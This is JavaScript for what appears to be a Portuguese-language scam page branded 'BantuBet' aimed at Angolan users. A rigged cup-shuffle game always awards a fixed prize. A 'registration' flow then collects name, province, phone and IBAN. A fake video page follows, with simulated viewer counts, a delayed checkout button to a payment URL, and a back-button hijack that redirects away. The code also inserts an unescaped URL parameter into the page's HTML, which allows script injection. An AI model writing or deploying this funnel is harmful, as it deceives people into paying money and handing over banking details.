    state.game.message = 'A fechar o copo...';
    updateGameDOM();

    gameActionTimer = setTimeout(() => {
      runKinematicShuffling();
    }, 500);
  }, 1500);
}

function runKinematicShuffling() {
  state.game.phase = 'shuffling';
  state.game.isShuffling = true;
  state.game.message = 'A baralhar... Observa com atenção!';
  updateGameDOM();

  const swapSequence = [
    { pair: [0, 1], speed: 380 },
    { pair: [1, 2], speed: 300 },
    { pair: [0, 2], speed: 260 },
    { pair: [0, 1], speed: 230 },
    { pair: [1, 2], speed: 260 },
    { pair: [0, 2], speed: 320 },
    { pair: [0, 1], speed: 420 }
  ];

  let currentSwapIdx = 0;

  function doNextSwap() {
    if (currentSwapIdx >= swapSequence.length) {
      for (let c = 0; c < 3; c++) {
        const wrap = document.getElementById(`cup-wrapper-${c}`);
        if (wrap) {
          wrap.style.zIndex = '15';
          wrap.style.transform = 'translateY(0px)';
          wrap.style.transition = 'left 300ms ease, transform 350ms cubic-bezier(0.34, 1.56, 0.64, 1)';
        }
      }

      setTimeout(() => {
        state.game.isShuffling = false;
        state.game.phase = 'choosing';
        state.game.message = 'Onde está a moeda? Clica num copo!';
        updateGameDOM();
      }, 500);
      return;
    }

    const { pair, speed } = swapSequence[currentSwapIdx];
    const slotA = pair[0];
    const slotB = pair[1];

    const cupA = state.game.cupSlots.indexOf(slotA);
    const cupB = state.game.cupSlots.indexOf(slotB);

    if (cupA !== -1 && cupB !== -1) {
      playSound('shuffle');

      const wrapA = document.getElementById(`cup-wrapper-${cupA}`);
      const wrapB = document.getElementById(`cup-wrapper-${cupB}`);

      if (wrapA && wrapB) {
        wrapA.style.transition = `left ${speed}ms cubic-bezier(0.45, 0, 0.55, 1), transform ${speed}ms ease`;
        wrapB.style.transition = `left ${speed}ms cubic-bezier(0.45, 0, 0.55, 1), transform ${speed} ease`;

        wrapA.style.zIndex = '25';
        wrapB.style.zIndex = '15';
        wrapA.style.transform = 'translateY(-18px)';
        wrapB.style.transform = 'translateY(4px)';
      }

      state.game.cupSlots[cupA] = slotB;
      state.game.cupSlots[cupB] = slotA;

      updateGameDOM();

      setTimeout(() => {
        if (wrapA) wrapA.style.transform = 'translateY(0px)';
        if (wrapB) wrapB.style.transform = 'translateY(0px)';
      }, speed * 0.7);
    }

    currentSwapIdx++;
    gameActionTimer = setTimeout(doNextSwap, speed + 30);
  }

  gameActionTimer = setTimeout(doNextSwap, 200);
}

function handleInteractiveCupClick(cupId) {
  if (state.game.isShuffling || state.game.roundCompleted) return;

  state.game.selectedCup = cupId;
  const isCorrect = (cupId === state.game.coinCupId);

  state.game.cupRaised[cupId] = true;
  updateGameDOM();

  if (isCorrect) {
    state.game.roundCompleted = true;
    state.game.phase = 'result_win';
    state.game.message = 'Acertaste! Ganhaste a rodada.';

    const prize = ROUND_REWARDS[state.game.currentRound - 1] || 12000;
    state.balance += prize;
    state.roundsWon++;

    playSound('win');
    playSound('coin');
    triggerConfetti();
    updateGameDOM();

  } else {
    playSound('lose');
    state.game.phase = 'result_loss';
    state.game.message = 'Copo vazio! Tenta novamente na mesma rodada.';
    updateGameDOM();

    setTimeout(() => {
      if (!state.game.roundCompleted) {
        state.game.cupRaised[cupId] = false;
        state.game.message = 'Onde está a moeda? Clica num copo!';
        updateGameDOM();
      }
    }, 900);
  }
}

function proceedAfterWin() {
  if (state.game.currentRound >= state.totalRounds) {
    state.balance = TOTAL_TARGET_PRIZE;
    navigateScreen('summary');
  } else {
    state.game.currentRound++;
    updateGameDOM();
    initRoundFlow();
  }
}

// --- 6. REGISTRATION FORM RENDERER ---
let regionDropdownOpen = false;

function getRegistrationHTML() {
  const step = state.regStep;
  const steps = ["intro", "name", "region", "phone"];
  const stepIdx = steps.indexOf(step);

  if (step === 'intro') {
    return `
      <header class="flex items-center justify-between px-4 py-3 bg-background/60 backdrop-blur-sm border-b border-border">
        <div class="logo-container-small"></div>
        <div class="flex items-center gap-2">
          <span class="text-lg font-bold text-accent tabular-nums reg-header-balance">${formatKz(state.balance)} Kz</span>
          <div class="w-10 h-10 bg-secondary rounded-full flex items-center justify-center border border-border">
            <span class="text-lg">👤</span>
          </div>
        </div>
      </header>

      <main class="flex-1 flex flex-col px-4 py-6 max-w-md mx-auto w-full">
        <div class="rounded-3xl p-6 text-center mb-6 border-premium bg-card/70 backdrop-blur-md relative overflow-hidden shadow-2xl">
          <div class="absolute inset-x-0 top-0 h-px shimmer-gold"></div>
          <div class="w-16 h-16 mx-auto mb-4 bg-accent/15 border border-accent/30 rounded-full flex items-center justify-center">
            <svg class="w-8 h-8 text-accent" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
              <circle cx="9" cy="7" r="4"></circle>
              <line x1="19" y1="8" x2="19" y2="14"></line>
              <line x1="22" y1="11" x2="16" y2="11"></line>
            </svg>
          </div>
          <p class="text-xs tracking-[0.3em] text-accent mb-2 font-semibold uppercase">ÚLTIMO PASSO</p>
          <h1 class="text-2xl font-bold text-foreground mb-2 text-balance">Cria a tua conta para receber</h1>
          <p class="text-4xl font-extrabold text-gold-gradient tabular-nums reg-intro-balance">${formatKz(state.balance)} Kz</p>
        </div>

        <div class="bg-card/70 backdrop-blur-md border border-border rounded-2xl p-6 shadow-xl space-y-6">
          <p class="text-center text-muted-foreground text-sm text-pretty">
            É rápido e <span class="text-foreground font-semibold">só leva 30 segundos</span>. Precisamos apenas dos teus dados para enviar os ganhos para a tua conta.
          </p>

          <div class="space-y-3">
            <div class="flex items-center gap-4 bg-secondary/60 border border-border rounded-xl p-3.5">
              <div class="w-9 h-9 bg-accent/15 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-4 h-4 text-accent" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                  <polygon points="13 2 3 14 12 14 11 22 21 10 12 10 13 2"></polygon>
                </svg>
              </div>
              <span class="text-foreground font-medium text-sm">Cadastro simples em poucos passos</span>
            </div>

            <div class="flex items-center gap-4 bg-secondary/60 border border-border rounded-xl p-3.5">
              <div class="w-9 h-9 bg-accent/15 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-4 h-4 text-accent" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                  <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
                </svg>
              </div>
              <span class="text-foreground font-medium text-sm">Dados seguros e protegidos</span>
            </div>

            <div class="flex items-center gap-4 bg-secondary/60 border border-border rounded-xl p-3.5">
              <div class="w-9 h-9 bg-accent/15 rounded-full flex items-center justify-center flex-shrink-0">
                <svg class="w-4 h-4 text-accent" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                  <path d="M9 17H7A5 5 0 0 1 7 7h2"></path>
                  <path d="M15 7h2a5 5 0 1 1 0 10h-2"></path>
                  <line x1="8" y1="12" x2="16" y2="12"></line>
                </svg>
              </div>
              <span class="text-foreground font-medium text-sm">Levantamento direto na tua conta</span>
            </div>
          </div>

          <button onclick="setRegStep('name')" class="w-full py-4 bg-primary text-primary-foreground font-bold rounded-2xl flex items-center justify-center gap-3 hover:brightness-110 active:scale-[0.99] transition-all text-lg animate-pulse-glow shadow-xl cursor-pointer">
            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M16 21v-2a4 4 0 0 0-4-4H6a4 4 0 0 0-4 4v2"></path>
              <circle cx="9" cy="7" r="4"></circle>
            </svg>
            Cadastrar e levantar
          </button>
          <p class="text-center text-xs text-muted-foreground">Ao continuar, aceitas os termos da BantuBet.</p>
        </div>
      </main>
    `;
  }

  return `
    <header class="flex items-center justify-between px-4 py-3 border-b border-border/40">
      <button onclick="handleRegBack()" class="w-10 h-10 bg-secondary border border-border rounded-full flex items-center justify-center hover:bg-muted transition-colors cursor-pointer">
        <svg class="w-5 h-5 text-foreground" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <polyline points="15 18 9 12 15 6"></polyline>
        </svg>
      </button>
      <div class="logo-container-small"></div>
      <div class="w-10 h-10 bg-secondary border border-border rounded-full flex items-center justify-center">
        <svg class="w-5 h-5 text-foreground" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
          <polygon points="11 5 6 9 2 9 2 15 6 15 11 19 11 5"></polygon>
          <path d="M15.54 8.46a5 5 0 0 1 0 7.07"></path>
        </svg>
      </div>
    </header>

    <div class="text-center my-4 px-4">
      <p class="text-xs tracking-[0.2em] text-muted-foreground mb-1 font-semibold uppercase">SALDO DISPONÍVEL</p>
      <div class="inline-flex items-center gap-2 bg-secondary rounded-full px-5 py-1.5 border border-accent/30 shadow-inner">
        <div class="w-2.5 h-2.5 bg-green-500 rounded-full animate-pulse"></div>
        <span class="text-lg font-bold text-accent tabular-nums reg-form-balance">${formatKz(state.balance)} Kz</span>
      </div>
    </div>

    <h1 class="text-2xl font-extrabold text-foreground text-center mb-3 italic px-4">Completar Perfil</h1>

    <!-- Progress bar -->
    <div class="flex justify-center gap-2 mb-6 px-4">
      ${[1, 2, 3, 4].map(idx => `
        <div class="w-10 h-1.5 rounded-full transition-colors ${idx <= stepIdx ? 'bg-primary' : 'bg-secondary'}"></div>
      `).join('')}
    </div>

    <main class="flex-1 flex flex-col px-4 pb-6 max-w-md mx-auto w-full">
      ${step === 'name' ? `
        <div class="bg-card/70 backdrop-blur-md border border-border rounded-2xl p-6 shadow-xl">
          <h2 class="text-xl font-bold text-foreground mb-1">Nome completo</h2>
          <p class="text-xs tracking-[0.2em] text-accent mb-4 font-semibold uppercase">NOME COMPLETO</p>
          <div class="bg-secondary border border-border rounded-xl p-4 flex items-center gap-3 focus-within:border-accent/50 transition-colors">
            <svg class="w-5 h-5 text-accent flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M20 21v-2a4 4 0 0 0-4-4H8a4 4 0 0 0-4 4v2"></path>
              <circle cx="12" cy="7" r="4"></circle>
            </svg>
            <input id="input-name" type="text" placeholder="Ex: Daniel da Silva" value="${state.userName !== 'Amigo' ? state.userName : ''}" oninput="state.userName = this.value;" class="bg-transparent flex-1 outline-none text-foreground placeholder-muted-foreground text-base"/>
          </div>
        </div>
      ` : ''}

      ${step === 'region' ? `
        <div class="bg-card/70 backdrop-blur-md border border-border rounded-2xl p-6 shadow-xl relative">
          <h2 class="text-xl font-bold text-foreground mb-1">Seleciona a tua região</h2>
          <p class="text-muted-foreground mb-4 text-sm">Escolhe a província onde vais levantar os teus ganhos</p>
          <button onclick="toggleRegionDropdown()" class="w-full bg-secondary border border-border rounded-xl p-4 flex items-center justify-between hover:border-accent/50 transition-colors cursor-pointer">
            <div class="flex items-center gap-3">
              <svg class="w-5 h-5 text-accent" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0z"></path>
                <circle cx="12" cy="10" r="3"></circle>
              </svg>
              <span class="${state.userRegion ? 'text-foreground' : 'text-muted-foreground'}">${state.userRegion || 'Selecionar província...'}</span>
            </div>
            <svg class="w-5 h-5 text-muted-foreground transition-transform ${regionDropdownOpen ? 'rotate-180' : ''}" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <polyline points="6 9 12 15 18 9"></polyline>
            </svg>
          </button>

          ${regionDropdownOpen ? `
            <div class="absolute left-4 right-4 mt-2 bg-[#131b2e] rounded-xl max-h-60 overflow-y-auto z-50 shadow-2xl border border-border">
              ${PROVINCIAS_ANGOLA.map(prov => `
                <button onclick="selectProvince('${prov}')" class="w-full px-6 py-3 text-left text-foreground hover:bg-[#1e2d47] transition-colors border-b border-border/50 last:border-b-0 cursor-pointer text-sm">
                  ${prov}
                </button>
              `).join('')}
            </div>
          ` : ''}
        </div>
      ` : ''}

      ${step === 'phone' ? `
        <div class="bg-card/70 backdrop-blur-md border border-border rounded-2xl p-6 shadow-xl space-y-4">
          <div>
            <h2 class="text-xl font-bold text-foreground mb-1">Dados para Levantamento</h2>
            <p class="text-muted-foreground text-xs mb-3">Preencha os dados onde deseja receber o valor de <strong class="text-accent reg-phone-balance">${formatKz(state.balance)} Kz</strong></p>
          </div>

          <!-- Bloco 1: Número de Telefone / Express -->
          <div>
            <label for="input-phone" class="block text-xs tracking-[0.15em] text-accent mb-1.5 font-semibold uppercase">
              Número de Telefone / Express
            </label>
            <div class="bg-secondary border border-border rounded-xl p-3.5 flex items-center gap-3 focus-within:border-accent/50 transition-colors">
              <svg class="w-5 h-5 text-accent flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <path d="M22 16.92v3a2 2 0 0 1-2.18 2 19.79 19.79 0 0 1-8.63-3.07 19.5 19.5 0 0 1-6-6 19.79 19.79 0 0 1-3.07-8.67A2 2 0 0 1 4.11 2h3a2 2 0 0 1 2 1.72 12.84 12.84 0 0 0 .7 2.81 2 2 0 0 1-.45 2.11L8.09 9.91a16 16 0 0 0 6 6l1.27-1.27a2 2 0 0 1 2.11-.45 12.84 12.84 0 0 0 2.81.7A2 2 0 0 1 22 16.92z"></path>
              </svg>
              <input id="input-phone" type="tel" placeholder="Ex: 9XX XXX XXX" value="${state.userPhone}" oninput="state.userPhone = this.value;" class="bg-transparent flex-1 outline-none text-foreground placeholder-muted-foreground text-base"/>
            </div>
          </div>

          <!-- Bloco 2: IBAN (21 Dígitos) -->
          <div>
            <label for="input-iban" class="block text-xs tracking-[0.15em] text-accent mb-1.5 font-semibold uppercase">
              IBAN (21 Dígitos)
            </label>
            <div class="bg-secondary border border-border rounded-xl p-3.5 flex items-center gap-3 focus-within:border-accent/50 transition-colors">
              <svg class="w-5 h-5 text-accent flex-shrink-0" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
                <rect x="3" y="5" width="18" height="14" rx="2"></rect>
                <line x1="3" y1="10" x2="21" y2="10"></line>
              </svg>
              <input id="input-iban" type="text" maxlength="32" placeholder="AO06 0000 0000 0000 0000 0" value="${state.userIban || ''}" oninput="state.userIban = this.value.toUpperCase();" class="bg-transparent flex-1 outline-none text-foreground placeholder-muted-foreground text-sm uppercase tracking-wider font-mono"/>
            </div>
          </div>

          <!-- Nota Explicativa -->
          <div class="rounded-xl border border-accent/25 bg-accent/5 p-3.5 text-left">
            <p class="text-xs text-muted-foreground leading-relaxed">
              <strong class="text-accent">Nota:</strong> Se não tiveres o Multicaixa Express activo, podes colocar o teu número de contacto normal no campo <strong>Número de Telefone / Express</strong> e preencher o <strong>IBAN</strong> para receberes a transferência bancária.
            </p>
          </div>
        </div>
      ` : ''}

      <div class="mt-6 space-y-3">
        <button id="btn-reg-submit" onclick="handleRegNext()" class="w-full py-4 bg-primary text-primary-foreground font-bold rounded-2xl flex items-center justify-center gap-2 hover:brightness-110 active:scale-[0.99] transition-all text-lg shadow-xl cursor-pointer">
          ${step === 'phone' ? `
            <svg class="w-5 h-5" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
              <path d="M12 22s8-4 8-10V5l-8-3-8 3v7c0 6 8 10 8 10z"></path>
            </svg>
            Levantar meus ganhos
          ` : 'Continuar'}
        </button>
        <button onclick="handleRegBack()" class="w-full py-3 text-accent font-medium text-sm cursor-pointer hover:underline">Voltar</button>
      </div>
    </main>
  `;
}

function updateRegistrationDOM() {
  const regScreen = document.getElementById('screen-registration');
  if (regScreen) {
    regScreen.innerHTML = getRegistrationHTML();
    populateStaticSVGs();
  }
}

function setRegStep(nextStep) {
  state.regStep = nextStep;
  regionDropdownOpen = false;
  updateRegistrationDOM();
}

function toggleRegionDropdown() {
  regionDropdownOpen = !regionDropdownOpen;
  updateRegistrationDOM();
}

function selectProvince(prov) {
  state.userRegion = prov;
  regionDropdownOpen = false;
  updateRegistrationDOM();
}

function handleRegBack() {
  const steps = ["intro", "name", "region", "phone"];
  const idx = steps.indexOf(state.regStep);
  if (idx > 0) {
    setRegStep(steps[idx - 1]);
  } else {
    navigateScreen('summary');
  }
}

function handleRegNext() {
  if (state.regStep === 'name') {
    if (!state.userName || state.userName.trim().length === 0) {
      alert("Por favor, digite seu nome completo.");
      return;
    }
    setRegStep('region');
  } else if (state.regStep === 'region') {
    if (!state.userRegion) {
      alert("Por favor, selecione a sua província.");
      return;
    }
    setRegStep('phone');
  } else if (state.regStep === 'phone') {
    if (!state.userPhone || state.userPhone.trim().length < 6) {
      alert("Por favor, insira o seu Número de Telefone / Express.");
      return;
    }
    if (typeof window.fbq === 'function') {
      window.fbq('track', 'Lead');
    }
    navigateScreen('vsl');
  }
}

// --- 7. VSL YOUTUBE TIMERS & INTERACTIONS ---
let viewerInterval = null;
let ctaDelayTimer = null;
const VSL_CHECKOUT_URL = "https://standerpay.com/checkout/baff68f5-ec55-4cc3-9b9a-194611b0256e";

function startVSLTimers() {
  if (ctaDelayTimer) clearTimeout(ctaDelayTimer);

  if (viewerInterval) clearInterval(viewerInterval);
  viewerInterval = setInterval(() => {
    state.vsl.viewers += Math.floor(Math.random() * 3) - 1;
    if (state.vsl.viewers < 255) state.vsl.viewers = 258;
    if (state.vsl.viewers > 270) state.vsl.viewers = 265;
    const el = document.getElementById('vsl-viewers');
    if (el) el.innerText = state.vsl.viewers;
  }, 4000);

  // CTA button appears after 250s (250000ms)
  ctaDelayTimer = setTimeout(() => {
    state.vsl.showCta = true;
    const ctaBox = document.getElementById('vsl-cta-box');
    if (ctaBox) {
      ctaBox.classList.remove('hidden');
    }
  }, 250000);

  window.history.pushState({ vslPage: true }, "");
  window.onpopstate = function() {
    window.location.href = "https://bantubet-discount-area.vercel.app/";
  };
}

function toggleSubscribe() {
  state.vsl.subscribed = !state.vsl.subscribed;
  const btn = document.getElementById('vsl-sub-btn');
  if (btn) {
    if (state.vsl.subscribed) {
      btn.className = "px-3 sm:px-4 py-2 rounded-full font-medium text-sm whitespace-nowrap transition-colors cursor-pointer bg-[#272727] text-white";
      btn.innerText = "INSCRITO";
    } else {
      btn.className = "px-3 sm:px-4 py-2 rounded-full font-medium text-sm whitespace-nowrap transition-colors cursor-pointer bg-white text-black hover:bg-gray-200";
      btn.innerText = "INSCREVER-SE";
    }
  }
}

function toggleVideoLike() {
  state.vsl.likedVideo = !state.vsl.likedVideo;
  if (state.vsl.likedVideo) {
    state.vsl.videoLikes++;
  } else {
    state.vsl.videoLikes--;
  }
  const btn = document.getElementById('vsl-like-btn');
  const count = document.getElementById('vsl-like-count');
  if (btn) {
    if (state.vsl.likedVideo) btn.classList.add('text-blue-400');
    else btn.classList.remove('text-blue-400');
  }
  if (count) count.innerText = formatCompact(state.vsl.videoLikes);
}

function toggleDescription() {
  state.vsl.descExpanded = !state.vsl.descExpanded;
  const textEl = document.getElementById('vsl-desc-text');
  const toggleBtn = document.getElementById('vsl-desc-toggle');
  if (textEl && toggleBtn) {
    if (state.vsl.descExpanded) {
      textEl.classList.remove('line-clamp-2');
      toggleBtn.innerText = 'Mostrar menos';
    } else {
      textEl.classList.add('line-clamp-2');
      toggleBtn.innerText = 'Mostrar mais';
    }
  }
}

function toggleCommentLike(id) {
  if (state.vsl.likedComments.has(id)) {
    state.vsl.likedComments.delete(id);
  } else {
    state.vsl.likedComments.add(id);
  }
  renderComments();
}

function trackCheckout() {
  if (typeof window.fbq === 'function') {
    window.fbq('track', 'InitiateCheckout', { value: state.balance, currency: 'AOA' });
  }
}

// --- GLOBAL ROUTER & DEV CONTROLS ---
let countdownTimerInterval = null;
let landingSeconds = 3599;

function navigateScreen(targetScreen) {
  if ((targetScreen === 'summary' || targetScreen === 'registration' || targetScreen === 'vsl') && state.balance === 0) {
    state.balance = TOTAL_TARGET_PRIZE;
    state.roundsWon = state.totalRounds;
  }

  state.screen = targetScreen;
  window.scrollTo({ top: 0, behavior: 'smooth' });

  // Hide all screens, show target
  const screenIds = ['intro', 'landing', 'welcome', 'playing', 'summary', 'registration', 'vsl'];
  screenIds.forEach(id => {
    const el = document.getElementById('screen-' + id);
    if (el) {
      if (id === targetScreen) {
        el.classList.remove('hidden');
      } else {
        el.classList.add('hidden');
      }
    }
  });

  // Dynamic balance sync in summary & registration
  document.querySelectorAll('.summary-balance, .summary-gain, .summary-total, .reg-header-balance, .reg-intro-balance, .reg-form-balance, .reg-phone-balance').forEach(el => {
    el.innerText = `${formatKz(state.balance)} Kz`;
  });
  document.querySelectorAll('.summary-rounds').forEach(el => {
    el.innerText = `${state.roundsWon}/${state.totalRounds}`;
  });
  document.querySelectorAll('.vsl-cta-text').forEach(el => {
    el.innerText = `ATIVAR CONTA BÓNUS – Levantar ${formatKz(state.balance)} Kz`;
  });

  if (targetScreen === 'landing') {
    if (!countdownTimerInterval) {
      countdownTimerInterval = setInterval(() => {
        if (landingSeconds > 0) landingSeconds--;
        const el = document.getElementById('landing-timer');
        if (el) {
          const mins = Math.floor(landingSeconds / 60).toString().padStart(2, '0');
          const secs = (landingSeconds % 60).toString().padStart(2, '0');
          el.innerText = `${mins}:${secs}`;
        }
      }, 1000);
    }
  }

  if (targetScreen === 'playing') {
    updateGameDOM();
    initRoundFlow();
  }

  if (targetScreen === 'registration') {
    updateRegistrationDOM();
  }

  if (targetScreen === 'vsl') {
    startVSLTimers();
  }
}

function toggleDevMenu() {
  const menu = document.getElementById('dev-menu');
  const iconOpen = document.getElementById('dev-icon-open');
  const iconClose = document.getElementById('dev-icon-close');
  if (!menu) return;
  const isHidden = menu.classList.contains('hidden');
  if (isHidden) {
    menu.classList.remove('hidden');
    menu.classList.add('flex');
    iconOpen.classList.add('hidden');
    iconClose.classList.remove('hidden');
  } else {
    menu.classList.add('hidden');
    menu.classList.remove('flex');
    iconOpen.classList.remove('hidden');
    iconClose.classList.add('hidden');
  }
}

// --- INITIALIZATION ---
function init() {
  const urlParams = new URLSearchParams(window.location.search);
  const utmKeys = ["utm_source", "utm_medium", "utm_campaign", "utm_content", "utm_term", "cidade", "nome"];
  
  let stored = {};
  try {
    const raw = window.sessionStorage.getItem('bb_entry_params');
    if (raw) stored = JSON.parse(raw);
  } catch (e) {}

  const current = {};
  for (const k of utmKeys) {
    const val = urlParams.get(k);
    if (val) current[k] = val.trim();
  }

  state.utmParams = { ...stored, ...current };
  try {
    window.sessionStorage.setItem('bb_entry_params', JSON.stringify(state.utmParams));
  } catch (e) {}

  if (state.utmParams.cidade) {
    state.cidade = state.utmParams.cidade
      .toLowerCase()
      .split(/\s+/)
      .map(w => w.charAt(0).toUpperCase() + w.slice(1))
      .join(' ');
  }

  if (state.utmParams.nome) {
    state.userName = state.utmParams.nome;
  }

  const seed = state.utmParams.utm_content || state.utmParams.utm_campaign || state.utmParams.utm_source;
  if (seed) {
    let hash = 0;
    for (let i = 0; i < seed.length; i++) {
      hash = (hash * 31 + seed.charCodeAt(i)) >>> 0;
    }
    state.variantIndex = hash % VARIANTS.length;
  } else {
    try {
      const storedVar = window.sessionStorage.getItem('bb_variant');
      if (storedVar !== null) {
        state.variantIndex = parseInt(storedVar, 10) % VARIANTS.length;
      } else {
        state.variantIndex = Math.floor(Math.random() * VARIANTS.length);
        window.sessionStorage.setItem('bb_variant', state.variantIndex.toString());
      }
    } catch (e) {
      state.variantIndex = 0;
    }
  }

  const variant = VARIANTS[state.variantIndex] || VARIANTS[0];
  const eyebrowEl = document.getElementById('landing-eyebrow');
  const descEl = document.getElementById('landing-desc');
  if (eyebrowEl) eyebrowEl.innerText = variant.eyebrow;
  if (descEl) descEl.innerText = variant.description;

  if (state.cidade) {
    const box = document.getElementById('landing-cidade-box');
    if (box) {
      box.innerHTML = `
        <div class="flex items-center justify-center gap-2 text-sm">
          <svg class="w-4 h-4 text-accent" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2">
            <path d="M20 10c0 4.993-5.539 10.193-7.399 11.799a1 1 0 0 1-1.202 0C9.539 20.193 4 14.993 4 10a8 8 0 0 1 16 0z"></path>
            <circle cx="12" cy="10" r="3"></circle>
          </svg>
          <span class="text-muted-foreground">Liberado para apostadores de <span class="font-bold text-foreground">${state.cidade}</span></span>
        </div>
      `;
    }
  }

  // Populate static SVG shapes & comments
  populateStaticSVGs();

  // Show starting screen
  navigateScreen(state.screen);
}

window.addEventListener('DOMContentLoaded', init);
